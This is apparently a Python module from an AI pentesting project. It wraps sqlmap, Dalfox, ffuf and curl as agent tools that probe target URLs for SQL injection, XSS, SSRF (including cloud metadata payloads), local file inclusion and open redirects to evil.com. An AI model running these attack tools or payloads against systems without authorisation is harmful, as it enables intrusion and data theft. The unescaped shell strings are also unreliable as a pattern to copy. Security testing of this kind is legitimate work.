"""
RedStrike.AI - Web Fuzzing Tools for Smolagents
"""
from smolagents import Tool
from typing import Optional
import json

from app.tools.docker_executor import get_docker_executor


class SQLiTester(Tool):
    """Test for SQL injection using sqlmap."""
    
    name = "sqli_tester"
    description = """
    Test a URL for SQL injection vulnerabilities using sqlmap.
    This is a comprehensive SQL injection testing tool.
    Use when you suspect a parameter might be vulnerable to SQLi.
    """
    inputs = {
        "url": {
            "type": "string",
            "description": "Target URL with parameters (e.g., http://example.com/page?id=1)"
        },
        "data": {
            "type": "string",
            "description": "POST data to test (for POST requests)",
            "nullable": True
        },
        "level": {
            "type": "integer",
            "description": "Test level 1-5 (higher = more tests, default: 1)",
            "nullable": True
        },
        "risk": {
            "type": "integer",
            "description": "Risk level 1-3 (higher = more risky tests, default: 1)",
            "nullable": True
        },
        "dbms": {
            "type": "string",
            "description": "Database type if known: 'mysql', 'postgresql', 'mssql', 'oracle'",
            "nullable": True
        }
    }
    output_type = "string"
    
    def forward(
        self,
        url: str,
        data: Optional[str] = None,
        level: Optional[int] = None,
        risk: Optional[int] = None,
        dbms: Optional[str] = None
    ) -> str:
        import asyncio
        
        args = f'-u "{url}" --batch'
        
        if data:
            args += f' --data="{data}"'
        
        if level:
            args += f" --level={level}"
        
        if risk:
            args += f" --risk={risk}"
        
        if dbms:
            args += f" --dbms={dbms}"
        
        result = asyncio.get_event_loop().run_until_complete(
            get_docker_executor().execute_tool("sqlmap", args)
        )
        
        # Parse sqlmap output for vulnerabilities
        vulnerable = "is vulnerable" in result["stdout"].lower() or "injectable" in result["stdout"].lower()
        
        return json.dumps({
            "url": url,
            "vulnerable": vulnerable,
            "output": result["stdout"],
            "success": result["success"]
        })


class XSSTester(Tool):
    """Test for XSS vulnerabilities using Dalfox."""
    
    name = "xss_tester"
    description = """
    Test a URL for Cross-Site Scripting (XSS) vulnerabilities using Dalfox.
    Can detect reflected, stored, and DOM-based XSS.
    """
    inputs = {
        "url": {
            "type": "string",
            "description": "Target URL with parameters to test"
        },
        "param": {
            "type": "string",
            "description": "Specific parameter to test (optional, tests all if not specified)",
            "nullable": True
        },
        "blind": {
            "type": "string",
            "description": "Blind XSS callback URL (e.g., your.burp.collaborator.net)",
            "nullable": True
        }
    }
    output_type = "string"
    
    def forward(self, url: str, param: Optional[str] = None, blind: Optional[str] = None) -> str:
        import asyncio
        
        args = f'url "{url}" --silence'
        
        if param:
            args += f" -p {param}"
        
        if blind:
            args += f" --blind {blind}"
        
        result = asyncio.get_event_loop().run_until_complete(
            get_docker_executor().execute_tool("dalfox", args)
        )
        
        # Parse for vulnerabilities
        findings = []
        for line in result["stdout"].split("\n"):
            if "[POC]" in line or "[V]" in line:
                findings.append(line.strip())
        
        return json.dumps({
            "url": url,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "output": result["stdout"],
            "success": result["success"]
        })


class SSRFTester(Tool):
    """Test for SSRF vulnerabilities."""
    
    name = "ssrf_tester"
    description = """
    Test a URL parameter for Server-Side Request Forgery (SSRF).
    Attempts to make the server fetch internal resources.
    """
    inputs = {
        "url": {
            "type": "string",
            "description": "Target URL with the parameter to test"
        },
        "param": {
            "type": "string",
            "description": "Parameter name that accepts URLs"
        },
        "callback": {
            "type": "string",
            "description": "Callback URL to detect blind SSRF (e.g., Burp Collaborator)",
            "nullable": True
        }
    }
    output_type = "string"
    
    def forward(self, url: str, param: str, callback: Optional[str] = None) -> str:
        import asyncio
        
        # Common SSRF payloads
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://[::1]",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
        ]
        
        if callback:
            payloads.append(callback)
        
        results = []
        base_url = url.split("?")[0]
        
        for payload in payloads:
            test_url = f"{base_url}?{param}={payload}"
            result = asyncio.get_event_loop().run_until_complete(
                get_docker_executor().execute(f'curl -s -o /dev/null -w "%{{http_code}}" "{test_url}"')
            )
            
            results.append({
                "payload": payload,
                "status_code": result["stdout"].strip(),
            })
        
        return json.dumps({
            "url": url,
            "parameter": param,
            "tests": results,
            "success": True
        })


class LFITester(Tool):
    """Test for Local File Inclusion vulnerabilities."""
    
    name = "lfi_tester"
    description = """
    Test a URL parameter for Local File Inclusion (LFI) vulnerabilities.
    Attempts to read local files through path traversal.
    """
    inputs = {
        "url": {
            "type": "string",
            "description": "Target URL with file parameter"
        },
        "param": {
            "type": "string",
            "description": "Parameter name that handles file paths"
        }
    }
    output_type = "string"
    
    def forward(self, url: str, param: str) -> str:
        import asyncio
        
        wordlist_path = get_docker_executor().get_wordlist_path("lfi")
        base_url = url.split("?")[0]
        
        # Use ffuf for LFI testing
        test_url = f"{base_url}?{param}=FUZZ"
        args = f'-u "{test_url}" -w {wordlist_path} -fc 404 -mr "root:|\\[boot loader\\]|\\[extensions\\]"'
        
        result = asyncio.get_event_loop().run_until_complete(
            get_docker_executor().execute_tool("ffuf", args)
        )
        
        return json.dumps({
            "url": url,
            "parameter": param,
            "output": result["stdout"],
            "vulnerable": "root:" in result["stdout"] or "[boot loader]" in result["stdout"],
            "success": result["success"]
        })


class OpenRedirectTester(Tool):
    """Test for Open Redirect vulnerabilities."""
    
    name = "open_redirect_tester"
    description = """
    Test URL parameters for Open Redirect vulnerabilities.
    Checks if redirect parameters can be abused to redirect to external sites.
    """
    inputs = {
        "url": {
            "type": "string",
            "description": "Target URL with redirect parameter"
        },
        "param": {
            "type": "string",
            "description": "Parameter name (e.g., 'redirect', 'url', 'next')"
        }
    }
    output_type = "string"
    
    def forward(self, url: str, param: str) -> str:
        import asyncio
        
        payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https:evil.com",
            "//evil.com/%2f%2e%2e",
            "////evil.com",
            "https://evil.com@legitimate.com",
        ]
        
        results = []
        base_url = url.split("?")[0]
        
        for payload in payloads:
            test_url = f"{base_url}?{param}={payload}"
            result = asyncio.get_event_loop().run_until_complete(
                get_docker_executor().execute(
                    f'curl -s -I -L -o /dev/null -w "%{{url_effective}}" "{test_url}"'
                )
            )
            
            effective_url = result["stdout"].strip()
            results.append({
                "payload": payload,
                "redirected_to": effective_url,
                "vulnerable": "evil.com" in effective_url,
            })
        
        vulnerable = any(r["vulnerable"] for r in results)
        
        return json.dumps({
            "url": url,
            "parameter": param,
            "tests": results,
            "vulnerable": vulnerable,
            "success": True
        })


# Export all tools
FUZZER_TOOLS = [
    SQLiTester(),
    XSSTester(),
    SSRFTester(),
    LFITester(),
    OpenRedirectTester(),
]
